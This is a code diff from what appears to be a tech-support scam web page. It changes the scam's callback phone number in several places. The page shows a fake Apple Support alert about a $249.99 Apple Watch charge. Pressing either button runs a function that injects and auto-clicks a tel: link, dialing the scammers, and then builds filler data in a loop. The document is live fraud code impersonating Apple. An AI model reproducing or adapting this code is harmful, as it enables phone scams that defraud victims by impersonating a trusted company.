@@ -55,7 +55,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-855-670-5148');
+        window.number = (window.number ? window.number : '+1-866-397-1514');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -113,7 +113,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-670-5148"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-397-1514"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -130,7 +130,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.99 Via Apple Pay Pre-Authorization for an Apple Watch purchase! We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-855-670-5148 to Freeze it!")) {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.99 Via Apple Pay Pre-Authorization for an Apple Watch purchase! We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-397-1514 to Freeze it!")) {
                 okkkk();
             } else {
                 okkkk();
